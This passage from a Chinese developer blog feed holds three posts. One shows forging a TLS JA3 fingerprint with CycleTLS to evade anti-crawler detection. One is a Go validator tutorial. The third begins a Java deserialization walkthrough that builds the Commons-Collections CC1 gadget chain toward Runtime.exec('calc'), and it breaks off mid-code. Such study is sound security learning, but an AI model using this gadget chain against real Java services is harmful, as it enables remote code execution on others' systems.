class="hljs-regexp">/video/</span>BV1u5411W79w/<br></code></pre></td></tr></table></figure><p>github上有一个基于Golang开发的开源模块CycleTLS ，可以更靠近底层去实现定制<code>ja3</code>指纹，直接自定义<code>ja3 fullstring</code>。</p><p><a href="https://github.com/Danny-Dasilva/CycleTLS">https://github.com/Danny-Dasilva/CycleTLS</a></p><p><img src="/./../blog_image/image-20231103184851991.png" alt="image-20231103184851991"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> github.<span class="hljs-keyword">com</span>/Danny-Dasilva/CycleTLS/cycletls <br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/Danny-Dasilva/CycleTLS/cycletls&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>client := cycletls.Init()<br><br>    <span class="hljs-comment">// https://ascii2d.net/</span><br>    <span class="hljs-comment">// https://cn.investing.com/equities/amazon-com-inc-historical-data</span><br>    <span class="hljs-comment">// https://match.yuanrenxue.cn/api/match/19?page=1</span><br>response, err := client.Do(<span class="hljs-string">&quot;https://tls.browserleaks.com/json&quot;</span>, cycletls.Options&#123;<br>Body:      <span class="hljs-string">&quot;&quot;</span>,<br>Ja3:       <span class="hljs-string">&quot;771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-51-57-47-53-10,0-23-65281-10-11-35-16-5-51-43-13-45-28-21,29-23-24-25-256-257,0&quot;</span>,<br>UserAgent: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0&quot;</span>,<br>&#125;, <span class="hljs-string">&quot;GET&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Print(<span class="hljs-string">&quot;Request Failed: &quot;</span> + err.Error())<br>&#125;<br>log.Println(response)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
      <tag>golang开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>validator实现参数校验</title>
    <link href="/2023/12/02/golang/validator%E5%AE%9E%E7%8E%B0%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C/"/>
    <url>/2023/12/02/golang/validator%E5%AE%9E%E7%8E%B0%E5%8F%82%E6%95%B0%E6%A0%A1%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="一-导入包："><a href="#一-导入包：" class="headerlink" title="一.导入包："></a>一.导入包：</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> get github.com/<span class="hljs-keyword">go</span>-playground/validator/v10<br></code></pre></td></tr></table></figure><h1 id="二-基本语法："><a href="#二-基本语法：" class="headerlink" title="二.基本语法："></a>二.基本语法：</h1><table><thead><tr><th align="center">标记</th><th align="center">标记说明</th><th align="center">例</th></tr></thead><tbody><tr><td align="center">required</td><td align="center">必填</td><td align="center">Field或Struct <code>validate:&quot;required&quot;</code></td></tr><tr><td align="center">omitempty</td><td align="center">空时忽略</td><td align="center">Field或Struct <code>validate:&quot;omitempty&quot;</code></td></tr><tr><td align="center">len</td><td align="center">长度</td><td align="center">Field <code>validate:&quot;len=0&quot;</code></td></tr><tr><td align="center">eq</td><td align="center">等于</td><td align="center">Field <code>validate:&quot;eq=0&quot;</code></td></tr><tr><td align="center">gt</td><td align="center">大于</td><td align="center">Field <code>validate:&quot;gt=0&quot;</code></td></tr><tr><td align="center">gte</td><td align="center">大于等于</td><td align="center">Field <code>validate:&quot;gte=0&quot;</code></td></tr><tr><td align="center">lt</td><td align="center">小于</td><td align="center">Field <code>validate:&quot;lt=0&quot;</code></td></tr><tr><td align="center">lte</td><td align="center">小于等于</td><td align="center">Field <code>validate:&quot;lte=0&quot;</code></td></tr><tr><td align="center">eqfield</td><td align="center">同一结构体字段相等</td><td align="center">Field <code>validate:&quot;eqfield=Field2&quot;</code></td></tr><tr><td align="center">nefield</td><td align="center">同一结构体字段不相等</td><td align="center">Field <code>validate:&quot;nefield=Field2&quot;</code></td></tr><tr><td align="center">gtfield</td><td align="center">大于同一结构体字段</td><td align="center">Field <code>validate:&quot;gtfield=Field2&quot;</code></td></tr><tr><td align="center">gtefield</td><td align="center">大于等于同一结构体字段</td><td align="center">Field <code>validate:&quot;gtefield=Field2&quot;</code></td></tr><tr><td align="center">ltfield</td><td align="center">小于同一结构体字段</td><td align="center">Field <code>validate:&quot;ltfield=Field2&quot;</code></td></tr><tr><td align="center">ltefield</td><td align="center">小于等于同一结构体字段</td><td align="center">Field <code>validate:&quot;ltefield=Field2&quot;</code></td></tr><tr><td align="center">eqcsfield</td><td align="center">跨不同结构体字段相等</td><td align="center">Struct1.Field <code>validate:&quot;eqcsfield=Struct2.Field2&quot;</code></td></tr><tr><td align="center">min</td><td align="center">最小值</td><td align="center">Field <code>validate:&quot;min=1&quot;</code></td></tr><tr><td align="center">max</td><td align="center">最大值</td><td align="center">Field <code>validate:&quot;max=2&quot;</code></td></tr><tr><td align="center">isdefault</td><td align="center">是默认值</td><td align="center">Field <code>validate:&quot;isdefault=0&quot;</code></td></tr><tr><td align="center">oneof</td><td align="center">其中之一</td><td align="center">Field <code>validate:&quot;oneof=5 7 9&quot;</code></td></tr><tr><td align="center">containsfield</td><td align="center">字段包含另一个字段</td><td align="center">Field <code>validate:&quot;containsfield=Field2&quot;</code></td></tr><tr><td align="center">email</td><td align="center">字符串值包含一个有效的电子邮件</td><td align="center">Field <code>validate:&quot;email&quot;</code></td></tr><tr><td align="center">json</td><td align="center">字符串值是否为有效的 JSON</td><td align="center">Field <code>validate:&quot;json&quot;</code></td></tr><tr><td align="center">file</td><td align="center">符串值是否包含有效的文件路径，以及该文件是否存在于计算机上</td><td align="center">Field <code>validate:&quot;file&quot;</code></td></tr><tr><td align="center">url</td><td align="center">符串值是否包含有效的 url</td><td align="center">Field <code>validate:&quot;url&quot;</code></td></tr><tr><td align="center">ip</td><td align="center">字符串值是否包含有效的 IP 地址</td><td align="center">Field <code>validate:&quot;ip&quot;</code></td></tr><tr><td align="center">ipv4</td><td align="center">字符串值是否包含有效的 ipv4地址</td><td align="center">Field <code>validate:&quot;ipv4&quot;</code></td></tr><tr><td align="center">datetime</td><td align="center">字符串值是否包含有效的 日期</td><td align="center">Field <code>validate:&quot;datetime&quot;</code></td></tr></tbody></table><h1 id="三-使用注意"><a href="#三-使用注意" class="headerlink" title="三.使用注意"></a>三.使用注意</h1><ol><li>当搜索条件与特殊标记冲突时,如：逗号（,），或操作（|），中横线（-）等则需要使用 UTF-8十六进制表示形式</li></ol><p>如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Test <span class="hljs-keyword">struct</span> &#123;<br>   Field1 <span class="hljs-type">string</span>  <span class="hljs-string">`validate:&quot;excludesall=|&quot;`</span>    <span class="hljs-comment">// 错误</span><br>   Field2 <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;excludesall=0x7C&quot;`</span> <span class="hljs-comment">// 正确.</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li><p>可通过validationErrors :&#x3D; errs.(validator.ValidationErrors)获取错误对象自定义返回响应错误</p></li><li><p>自定义校验结果翻译</p></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 初始化翻译器</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validateInit</span><span class="hljs-params">()</span></span> &#123;<br>zh_ch := zh.New()<br>uni := ut.New(zh_ch)               <span class="hljs-comment">// 万能翻译器，保存所有的语言环境和翻译数据</span><br>Trans, _ = uni.GetTranslator(<span class="hljs-string">&quot;zh&quot;</span>) <span class="hljs-comment">// 翻译器</span><br>Validate = validator.New()<br>_ = zh_translations.RegisterDefaultTranslations(Validate, Trans)<br><span class="hljs-comment">// 添加额外翻译</span><br>_ = Validate.RegisterTranslation(<span class="hljs-string">&quot;required_without&quot;</span>, Trans, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ut ut.Translator)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> ut.Add(<span class="hljs-string">&quot;required_without&quot;</span>, <span class="hljs-string">&quot;&#123;0&#125; 为必填字段!&quot;</span>, <span class="hljs-literal">true</span>)<br>&#125;, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ut ut.Translator, fe validator.FieldError)</span></span> <span class="hljs-type">string</span> &#123;<br>t, _ := ut.T(<span class="hljs-string">&quot;required_without&quot;</span>, fe.Field())<br><span class="hljs-keyword">return</span> t<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>如果需要校验多种，需要使用<code>,</code>进行分隔，如下：</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> UserLoginRequest <span class="hljs-keyword">struct</span> &#123;<br>    CaptchaCode <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;captcha_code&quot; validate:&quot;required,ValidateCaptchaCodeLength&quot;`</span><br>    UserName    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;user_name&quot; validate:&quot;required,min=5,max=16&quot; label:&quot;用户名&quot;`</span><br>    Password    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;password&quot; validate:&quot;required,min=5,max=16&quot; label:&quot;密码&quot;`</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="四-使用案例："><a href="#四-使用案例：" class="headerlink" title="四.使用案例："></a>四.使用案例：</h1><h2 id="4-1-实现国际化-中文："><a href="#4-1-实现国际化-中文：" class="headerlink" title="4.1 实现国际化&#x2F;中文："></a>4.1 实现国际化&#x2F;中文：</h2><p><code>translator := ut.New(zh.New())</code>可以实现中文翻译</p><p><code> trans, _ = translator.GetTranslator(&quot;zh&quot;)</code>这里有个坑，就是第二个参数是bool，不管是<code>en</code>还是<code>zh</code>都是会报错的，忽略可以正常运行。</p><p><code>RegisterTagNameFunc</code>就是获取我们自定义的字段的tag，后面就可以实现这个label的值加上报错信息了(label的值为中文)。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitValidator</span><span class="hljs-params">()</span></span> (*validator.Validate, ut.Translator) &#123;<br>    validate = validator.New()<br>    translator := ut.New(zh.New())<br>    trans, _ = translator.GetTranslator(<span class="hljs-string">&quot;zh&quot;</span>)<br>    err := zhTrans.RegisterDefaultTranslations(validate, trans)<br>    <span class="hljs-comment">// 注册自定义方法 可以实现 label字段+错误信息</span><br>    validate.RegisterTagNameFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(fld reflect.StructField)</span></span> <span class="hljs-type">string</span> &#123;<br>       name := fld.Tag.Get(<span class="hljs-string">&quot;label&quot;</span>)<br>       <span class="hljs-keyword">return</span> name<br>    &#125;)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;registerDefaultTranslations fail: %s\n&quot;</span>, err.Error()))<br>    &#125;<br>    <span class="hljs-keyword">return</span> validate, trans<br>&#125;<br></code></pre></td></tr></table></figure><p>在gin中如何校验？</p><p>使用<code>validator.Struct</code>就可以对其进行校验了，如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> err := global.Validator.Struct(&amp;req); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, fieldError := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>response.FailWithMessage(fieldError.Translate(global.Translator), ctx)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的<code>fieldError</code>我们可以获取当前报错的字段的信息如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>fmt.Println(err.Namespace())       <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.Field())           <span class="hljs-comment">// Age</span><br>fmt.Println(err.StructNamespace()) <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.StructField())     <span class="hljs-comment">// Age</span><br>fmt.Println(err.Tag())             <span class="hljs-comment">// lte</span><br>fmt.Println(err.ActualTag())       <span class="hljs-comment">// lte</span><br>fmt.Println(err.Kind())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Type())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Value())           <span class="hljs-comment">// 135</span><br>fmt.Println(err.Param())           <span class="hljs-comment">// 130</span><br>fmt.Println(err.Error())           <span class="hljs-comment">// Key: &#x27;User.Age&#x27; Error:Field validation for &#x27;Age&#x27; failed on the &#x27;lte&#x27; tag</span><br>fmt.Println()<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-自定义校验方法："><a href="#4-2-自定义校验方法：" class="headerlink" title="4.2 自定义校验方法："></a>4.2 自定义校验方法：</h2><p>需要自定义校验方法，只需要使用<code>RegisterValidation</code>即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// RegisterValidation adds a validation with the given tag</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// NOTES:</span><br><span class="hljs-comment">// - if the key already exists, the previous validation function will be replaced.</span><br><span class="hljs-comment">// - this method is not thread-safe it is intended that these all be registered prior to any validation</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v *Validate)</span></span> RegisterValidation(tag <span class="hljs-type">string</span>, fn Func, callValidationEvenIfNull ...<span class="hljs-type">bool</span>) <span class="hljs-type">error</span> &#123;<br>    <span class="hljs-keyword">return</span> v.RegisterValidationCtx(tag, wrapFunc(fn), callValidationEvenIfNull...)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Func</code>是一个<code>type Func func(fl FieldLevel) bool</code></p><p>这里的方法，可以写指针接收者，也可以写直接收者都是无所谓的，返回值一定需要是布尔类型，</p><p>完整代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-string">&quot;github.com/go-playground/validator/v10&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;<br>FirstName <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;required&quot;`</span><br>LastName  <span class="hljs-type">string</span> <span class="hljs-string">`validate:&quot;required&quot;`</span><br>Age       <span class="hljs-type">uint8</span>  <span class="hljs-string">`validate:&quot;validateAge&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u *User)</span></span> ValidateAge(fl validator.FieldLevel) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-comment">// 在自定义验证方法中获取字段的值</span><br><span class="hljs-keyword">return</span> fl.Field().Uint() &gt; <span class="hljs-number">4</span><br>&#125;<br><br><span class="hljs-keyword">var</span> validate *validator.Validate<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>validate = validator.New()<br>user := &amp;User&#123;<br>FirstName: <span class="hljs-string">&quot;Badger&quot;</span>,<br>LastName:  <span class="hljs-string">&quot;Smith&quot;</span>,<br>Age:       <span class="hljs-number">34</span>,<br>&#125;<br>validate.RegisterValidation(<span class="hljs-string">&quot;validateAge&quot;</span>, user.ValidateAge)<br>validateStruct(user)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validateStruct</span><span class="hljs-params">(user *User)</span></span> &#123;<br><br>err := validate.Struct(user)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> err.(validator.ValidationErrors) &#123;<br>fmt.Println(err.Namespace())       <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.Field())           <span class="hljs-comment">// Age</span><br>fmt.Println(err.StructNamespace()) <span class="hljs-comment">// User.Age</span><br>fmt.Println(err.StructField())     <span class="hljs-comment">// Age</span><br>fmt.Println(err.Tag())             <span class="hljs-comment">// lte</span><br>fmt.Println(err.ActualTag())       <span class="hljs-comment">// lte</span><br>fmt.Println(err.Kind())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Type())            <span class="hljs-comment">// uint8</span><br>fmt.Println(err.Value())           <span class="hljs-comment">// 135</span><br>fmt.Println(err.Param())           <span class="hljs-comment">// 130</span><br>fmt.Println(err.Error())           <span class="hljs-comment">// Key: &#x27;User.Age&#x27; Error:Field validation for &#x27;Age&#x27; failed on the &#x27;lte&#x27; tag</span><br>fmt.Println()<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>关键点在于：</p><ol><li>tag中定义我们需要的校验方法</li><li>使用<code>RegisterValidation(tag,function) bool</code>方法注册校验方法</li></ol>]]></content>
    
    
    <categories>
      
      <category>golang开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cc1调用链</title>
    <link href="/2023/10/26/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/cc%E9%93%BE/cc1%E8%B0%83%E7%94%A8%E9%93%BE1/"/>
    <url>/2023/10/26/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/cc%E9%93%BE/cc1%E8%B0%83%E7%94%A8%E9%93%BE1/</url>
    
    <content type="html"><![CDATA[<h1 id="1-配置环境："><a href="#1-配置环境：" class="headerlink" title="1. 配置环境："></a>1. 配置环境：</h1><p>cc1调用链需要环境如下:</p><ul><li>jdk1.8.0_65</li><li>commons-collections 版本号为<code>3.2.1</code></li><li><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">jdk1.8_65源码</a></li></ul><ol><li>下载<code>jdk 8u65</code> <a href="https://blog.lupf.cn/articles/2022/02/19/1645283454543.html">Oracle JDK 8u65 全平台安装包下载 - 码霸霸 (lupf.cn)</a></li><li>导入坐标如下</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ol start="3"><li>解压jdk1.8.0_65下是src文件，将jdk1.8.0_65源码中的<code>src/share/clasess/sun</code>添加到你配置的1.8.0_65中的<code>src</code>目录中。</li></ol><p>教程：</p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=a015846fd4dda3664f6a3becf9028a53">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></p><h1 id="2-思路："><a href="#2-思路：" class="headerlink" title="2. 思路："></a>2. 思路：</h1><p><img src="/../../../blog_image/image-20231023230226781-1698124632828-1.png" alt="image-20231023230226781"></p><p>从调用危险方法到调用顶层<code>readObject</code>实现反序列化</p><h1 id="3-探索："><a href="#3-探索：" class="headerlink" title="3. 探索："></a>3. 探索：</h1><h2 id="3-1-简单找个危险函数："><a href="#3-1-简单找个危险函数：" class="headerlink" title="3.1 简单找个危险函数："></a>3.1 简单找个危险函数：</h2><h3 id="突破口-transform方法："><a href="#突破口-transform方法：" class="headerlink" title="- 突破口 transform方法："></a>- 突破口 transform方法：</h3><p>找到一个接口，查看他的实现类</p><p><img src="/../../../blog_image/image-20231023230454765.png" alt="image-20231023230454765"></p><p>找到一个<code>InvokerTranformer</code>类的<code>transform</code>方法，接收参数是可控的，即获取了当前传入obejct类，然后调用反射去调用成员变量的函数名和函数参数，找到他的构造函数</p><p><img src="/../../../blog_image/image-20231023230819092.png" alt="image-20231023230819092"></p><p>第一个参数是方法名，第二个参数是参数类型，第三个参数是参数值。我们通过构造函数然后去调用<code>transform</code>方法即可调用我们传入类的方法了。</p><p>我们任意调用的方法是这样的<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>这里使用<code>InvokerTransformer</code>就是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        .transform(runtime);<br></code></pre></td></tr></table></figure><h3 id="解决Runtime不能反序列化"><a href="#解决Runtime不能反序列化" class="headerlink" title="- 解决Runtime不能反序列化"></a>- 解决Runtime不能反序列化</h3><p>找到突破口之后，我们要想<code>readObject</code>方法是反序列化才会使用，但是<code>Runtime</code>没有实现<code>SSerializable</code>方法，因此不能实现反序列化。</p><p>如何解决？Class类都是可序列化的，因此我们序列化<code>Runtime.class</code>。</p><p>查看源码发现，<code>Runtime</code>类的构造方法都是私有的，只有一个静态方法<code>getRuntime</code>返回<code>currentRuntime</code>，用到的是单例模式。因此只能反射调用<code>getRuntime</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// InvokerTransformer 传入形参会通过反射进行调用</span><br>Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeClassMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) runtimeClassMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>首先获取Runtime.class这个class对象</li><li>然后调用<code>getRuntime</code>静态方法获取当前的<code>runtimeClassMethod</code>方法。</li><li>然后使用<code>runtimeClassMethod</code>方法类去<code>invoke</code>，即调用<code>getRuntime</code>方法，<code>invoke</code>方法第一个参数是类的实例对象，第二个参数是这个方法执行的参数。因为需要<code>Runtime</code>类才能调用这个私有方法，因此第一个参数是我们上面获取到的对象。</li></ul><h2 id="3-2-TransformedMap类："><a href="#3-2-TransformedMap类：" class="headerlink" title="3.2 TransformedMap类："></a>3.2 TransformedMap类：</h2><p>上面我们查找到了调用<code>TransformedMap</code>类中的<code>checkSetValue</code>方法，我们接着网上找，发现<code>AbstractInputCheckedMapDecorator</code>类中的内部类<code>MapEntry</code>的<code>setValue</code>方法调用了他，只要我们执行map的<code>setValue</code>将我们上面的<code>Object Input</code>传入进去就可以执行了，如下：</p><p><img src="/../../../blog_image/image-20231026162650565.png" alt="image-20231026162650565"></p><p>发现是<code>AbstractInputCheckedMapDecorator</code>中的<code>MapEntry</code>的<code>setValue</code>方法。</p><p><img src="/../../../blog_image/image-20231026162832837.png" alt="image-20231026162832837"></p><p>编写构造链如图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">TransformedMapExp02</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// TransformedMap 这个类继承AbstractInputCheckedMapDecorator类 重写了checkSetValue 方法</span><br>    <span class="hljs-comment">// AbstractInputCheckedMapDecorator 类中的一个匿名MapEntry类调用setValue方法 回调用checkSetValue</span><br>    <span class="hljs-comment">// 尝试调用MapEntry的set方法</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title 